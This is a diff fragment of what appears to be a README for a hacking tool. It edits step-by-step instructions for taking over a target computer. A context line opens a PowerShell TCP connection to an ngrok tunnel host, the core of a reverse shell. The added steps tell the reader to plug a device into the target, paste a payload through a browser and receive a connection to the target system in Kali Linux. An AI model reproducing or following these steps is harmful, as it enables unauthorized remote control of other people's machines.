@@ -134,7 +134,10 @@ add libraries which are needed<br/>
      $client = New-Object System.Net.Sockets.TCPClient("0.tcp.in.ngrok.io", 15660)
 
 # Now the final part of hacking
+
+  ** IN Kali linux **
   ##1.  now start ngrok server. <br/>
+  ##2.  plug in the device to target.<br/>
   ##2.  open broswer and type ip address and click enter.<br/>
   ##3.  now paste payload in textbox and then click send<br/>
   ##4.  In 5 second you will get connetion of target system in kali linux.<br/>
